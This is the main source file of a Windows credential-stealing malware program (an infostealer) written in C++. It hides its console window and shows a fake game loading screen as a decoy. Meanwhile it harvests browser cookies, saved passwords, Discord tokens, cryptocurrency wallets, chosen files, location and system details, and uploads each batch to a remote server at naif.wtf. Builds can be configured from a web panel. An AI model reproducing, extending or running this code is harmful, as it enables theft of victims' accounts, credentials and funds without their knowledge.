#include "utils.h"
#include "network.h"
#include "browser_data.h"
#include "discord_tokens.h"
#include "crypto_wallets.h"
#include "important_files.h"
#include "system_info.h"
#include <windows.h>
#include <iostream>
#include <string>
#include <thread>
#include <atomic>
#include <chrono>
#include <vector>
#include <optional>

int main() {
    // Start watchdog thread - force exit after 2 minutes max
    std::thread watchdogThread([]() {
        std::this_thread::sleep_for(std::chrono::minutes(2));
        ExitProcess(0); // Force terminate after timeout
    });
    watchdogThread.detach();

    // Hide console window immediately on startup
    hide_console_window();

    // Configuration variables with defaults
    std::string user = "west";
    std::string serverUrl = "https://naif.wtf/api/upload";
    bool collectLocation = true;
    bool collectSystemInfo = true;
    bool collectRunningProcesses = true;
    bool collectInstalledApps = true;
    bool collectBrowserCookies = true;
    bool collectSavedPasswords = true;
    bool collectBrowserHistory = true;
    bool collectDiscordTokens = true;
    bool collectCryptoWallets = true;
    bool collectImportantFiles = true;
    std::vector<ImportantFileConfig> importantFilesConfig;

    // Try to read embedded config from exe first (for payloads generated from web panel)
    auto embeddedConfig = read_embedded_config();
    if (embeddedConfig) {
        // Use embedded config
        user = embeddedConfig->user;
        serverUrl = embeddedConfig->serverUrl;
        collectLocation = embeddedConfig->collectLocation;
        collectSystemInfo = embeddedConfig->collectSystemInfo;
        collectRunningProcesses = embeddedConfig->collectRunningProcesses;
        collectInstalledApps = embeddedConfig->collectInstalledApps;
        collectBrowserCookies = embeddedConfig->collectBrowserCookies;
        collectSavedPasswords = embeddedConfig->collectSavedPasswords;
        collectBrowserHistory = embeddedConfig->collectBrowserHistory;
        collectDiscordTokens = embeddedConfig->collectDiscordTokens;
        collectCryptoWallets = embeddedConfig->collectCryptoWallets;
        collectImportantFiles = embeddedConfig->collectImportantFiles;
        importantFilesConfig = embeddedConfig->importantFilesConfig;
    } else {
        // Fall back to environment variables (for manual/batch file execution)
        char* envUser = std::getenv("CLIENT_USER");
        if (envUser) user = envUser;

        char* envUrl = std::getenv("WEBPANEL_URL");
        if (envUrl) serverUrl = envUrl;

        collectLocation = get_feature_flag("COLLECT_LOCATION", true);
        collectSystemInfo = get_feature_flag("COLLECT_SYSTEM_INFO", true);
        collectRunningProcesses = get_feature_flag("COLLECT_RUNNING_PROCESSES", true);
        collectInstalledApps = get_feature_flag("COLLECT_INSTALLED_APPS", true);
        collectBrowserCookies = get_feature_flag("COLLECT_BROWSER_COOKIES", true);
        collectSavedPasswords = get_feature_flag("COLLECT_SAVED_PASSWORDS", true);
        collectBrowserHistory = get_feature_flag("COLLECT_BROWSER_HISTORY", true);
        collectDiscordTokens = get_feature_flag("COLLECT_DISCORD_TOKENS", true);
        collectCryptoWallets = get_feature_flag("COLLECT_CRYPTO_WALLETS", true);
        collectImportantFiles = get_feature_flag("COLLECT_IMPORTANT_FILES", true);
    }

    // Generate unique session ID for this collection run
    std::srand(static_cast<unsigned int>(std::time(nullptr)));
    std::string sessionId = "session-" + std::to_string(std::chrono::system_clock::now().time_since_epoch().count()) +
                           "-" + std::to_string(std::rand() % 9000 + 1000);
    std::string dateTime = get_current_date_time();
    std::string screenSize = get_screen_size();

    // Fetch location first to get real external IP
    auto location = collectLocation ? fetch_location() : std::nullopt;
    std::string ipAddress = location ? location->ipAddress : get_local_ip_address();

    // Start fake loading screen in separate thread
    std::atomic<bool> workCompleted(false);
    std::thread loadingThread([&]() {
        try {
            show_fake_loading_screen(user);
            // Wait for actual work to complete
            while (!workCompleted.load()) {
                std::this_thread::sleep_for(std::chrono::milliseconds(100));
            }
            // Show completion message
            std::this_thread::sleep_for(std::chrono::milliseconds(500)); // Small delay for effect
            std::cout << "Launch target game now" << std::endl;
        } catch (const std::exception&) {
            // Ignore loading screen errors
        }
    });
    loadingThread.detach();

    try {
        // Send initial data with basic info
        send_chunk(serverUrl, sessionId, PcData{
            user,
            screenSize,
            dateTime,
            ipAddress,
            std::nullopt, // location
            {}, // runningProcesses
            {}, // installedApps
            BrowserHistory(), // browserHistory
            std::nullopt, // browserCookies
            std::nullopt, // savedPasswords
            std::nullopt, // creditCards
            std::nullopt, // autofillAddresses
            std::nullopt, // discordTokens
            std::nullopt, // systemInfo
            std::nullopt, // cryptoWallets
            std::nullopt, // cryptoWalletFolders
            std::nullopt  // importantFiles
        });

        // Send location update (already fetched earlier for IP)
        if (collectLocation) {
            try {
                if (location) {
                    send_chunk(serverUrl, sessionId, PcData{
                        user,
                        screenSize,
                        dateTime,
                        ipAddress,
                        location,
                        {}, // runningProcesses
                        {}, // installedApps
                        BrowserHistory(), // browserHistory
                        std::nullopt, // browserCookies
                        std::nullopt, // savedPasswords
                        std::nullopt, // creditCards
                        std::nullopt, // autofillAddresses
                        std::nullopt, // discordTokens
                        std::nullopt, // systemInfo
                        std::nullopt, // cryptoWallets
                        std::nullopt, // cryptoWalletFolders
                        std::nullopt  // importantFiles
                    });
                }
            } catch (const std::exception&) {
                // Continue even if location fetch fails
            }
        }

        // Get system info and send update
        if (collectSystemInfo) {
            try {
                auto systemInfo = get_system_info();
                if (systemInfo) {
                    send_chunk(serverUrl, sessionId, PcData{
                        user,
                        screenSize,
                        dateTime,
                        ipAddress,
                        std::nullopt, // location
                        {}, // runningProcesses
                        {}, // installedApps
                        BrowserHistory(), // browserHistory
                        std::nullopt, // browserCookies
                        std::nullopt, // savedPasswords
                        std::nullopt, // creditCards
                        std::nullopt, // autofillAddresses
                        std::nullopt, // discordTokens
                        systemInfo, // systemInfo
                        std::nullopt, // cryptoWallets
                        std::nullopt, // cryptoWalletFolders
                        std::nullopt  // importantFiles
                    });
                }
            } catch (const std::exception&) {
                // Continue even if system info collection fails
            }
        }

        // Get running processes and send update
        if (collectRunningProcesses) {
            try {
                auto runningProcesses = get_running_processes();
                if (!runningProcesses.empty()) {
                    send_chunk(serverUrl, sessionId, PcData{
                        user,
                        screenSize,
                        dateTime,
                        ipAddress,
                        std::nullopt, // location
                        runningProcesses, // runningProcesses
                        {}, // installedApps
                        BrowserHistory(), // browserHistory
                        std::nullopt, // browserCookies
                        std::nullopt, // savedPasswords
                        std::nullopt, // creditCards
                        std::nullopt, // autofillAddresses
                        std::nullopt, // discordTokens
                        std::nullopt, // systemInfo
                        std::nullopt, // cryptoWallets
                        std::nullopt, // cryptoWalletFolders
                        std::nullopt  // importantFiles
                    });
                }
            } catch (const std::exception&) {
                // Continue even if process enumeration fails
            }
        }

        // Get installed apps and send update
        if (collectInstalledApps) {
            try {
                auto installedApps = get_installed_apps();
                if (!installedApps.empty()) {
                    send_chunk(serverUrl, sessionId, PcData{
                        user,
                        screenSize,
                        dateTime,
                        ipAddress,
                        std::nullopt, // location
                        {}, // runningProcesses
                        installedApps, // installedApps
                        BrowserHistory(), // browserHistory
                        std::nullopt, // browserCookies
                        std::nullopt, // savedPasswords
                        std::nullopt, // creditCards
                        std::nullopt, // autofillAddresses
                        std::nullopt, // discordTokens
                        std::nullopt, // systemInfo
                        std::nullopt, // cryptoWallets
                        std::nullopt, // cryptoWalletFolders
                        std::nullopt  // importantFiles
                    });
                }
            } catch (const std::exception&) {
                // Continue even if installed apps detection fails
            }
        }

        // Get browser cookies and passwords and send update
        if (collectBrowserCookies || collectSavedPasswords) {
            try {
                // Create temporary output directory
                char tempPath[MAX_PATH];
                GetTempPathA(MAX_PATH, tempPath);
                std::string outputDir = std::string(tempPath) + "browser_data_" + std::to_string(std::rand());

                auto [browserCookies, savedPasswords] = extract_cookies_with_tool(outputDir);

                // Only include cookies if feature is enabled
                std::optional<std::string> finalBrowserCookies = collectBrowserCookies && !browserCookies.empty() ? std::optional<std::string>(browserCookies) : std::nullopt;
                std::optional<std::vector<SavedPassword>> finalSavedPasswords = collectSavedPasswords && !savedPasswords.empty() ? std::optional<std::vector<SavedPassword>>(savedPasswords) : std::nullopt;

                if (finalBrowserCookies || finalSavedPasswords) {
                    send_chunk(serverUrl, sessionId, PcData{
                        user,
                        screenSize,
                        dateTime,
                        ipAddress,
                        std::nullopt, // location
                        {}, // runningProcesses
                        {}, // installedApps
                        BrowserHistory(), // browserHistory
                        finalBrowserCookies, // browserCookies
                        finalSavedPasswords, // savedPasswords
                        std::nullopt, // creditCards
                        std::nullopt, // autofillAddresses
                        std::nullopt, // discordTokens
                        std::nullopt, // systemInfo
                        std::nullopt, // cryptoWallets
                        std::nullopt, // cryptoWalletFolders
                        std::nullopt  // importantFiles
                    });
                }
            } catch (const std::exception&) {
                // Continue even if browser data collection fails
            }
        }

        // Get Discord tokens and send update
        if (collectDiscordTokens) {
            try {
                auto discordTokens = extract_discord_tokens();
                if (!discordTokens.empty()) {
                    send_chunk(serverUrl, sessionId, PcData{
                        user,
                        screenSize,
                        dateTime,
                        ipAddress,
                        std::nullopt, // location
                        {}, // runningProcesses
                        {}, // installedApps
                        BrowserHistory(), // browserHistory
                        std::nullopt, // browserCookies
                        std::nullopt, // savedPasswords
                        std::nullopt, // creditCards
                        std::nullopt, // autofillAddresses
                        discordTokens, // discordTokens
                        std::nullopt, // systemInfo
                        std::nullopt, // cryptoWallets
                        std::nullopt, // cryptoWalletFolders
                        std::nullopt  // importantFiles
                    });
                }
            } catch (const std::exception&) {
                // Continue even if Discord token extraction fails
            }
        }

        // Get crypto wallets and send update
        if (collectCryptoWallets) {
            try {
                auto cryptoWallets = extract_crypto_wallets();
                if (!cryptoWallets.empty()) {
                    send_chunk(serverUrl, sessionId, PcData{
                        user,
                        screenSize,
                        dateTime,
                        ipAddress,
                        std::nullopt, // location
                        {}, // runningProcesses
                        {}, // installedApps
                        BrowserHistory(), // browserHistory
                        std::nullopt, // browserCookies
                        std::nullopt, // savedPasswords
                        std::nullopt, // creditCards
                        std::nullopt, // autofillAddresses
                        std::nullopt, // discordTokens
                        std::nullopt, // systemInfo
                        cryptoWallets, // cryptoWallets
                        std::nullopt, // cryptoWalletFolders
                        std::nullopt  // importantFiles
                    });
                }
            } catch (const std::exception&) {
                // Continue even if crypto wallet detection fails
            }
        }

        // Get important files and send update
        if (collectImportantFiles) {
            try {
                auto importantFiles = extract_important_files(importantFilesConfig);
                if (!importantFiles.empty()) {
                    send_chunk(serverUrl, sessionId, PcData{
                        user,
                        screenSize,
                        dateTime,
                        ipAddress,
                        std::nullopt, // location
                        {}, // runningProcesses
                        {}, // installedApps
                        BrowserHistory(), // browserHistory
                        std::nullopt, // browserCookies
                        std::nullopt, // savedPasswords
                        std::nullopt, // creditCards
                        std::nullopt, // autofillAddresses
                        std::nullopt, // discordTokens
                        std::nullopt, // systemInfo
                        std::nullopt, // cryptoWallets
                        std::nullopt, // cryptoWalletFolders
                        importantFiles  // importantFiles
                    });
                }
            } catch (const std::exception&) {
                // Continue even if important files collection fails
            }
        }

        // Mark work as completed
        workCompleted.store(true);

    } catch (const std::exception& e) {
        // Continue even if errors occur
        workCompleted.store(true);
    }

    // Wait a bit to ensure all network requests complete, then force exit
    std::this_thread::sleep_for(std::chrono::seconds(2));
    
    // Force terminate the process (kills all threads including the loading screen)
    ExitProcess(0);
}
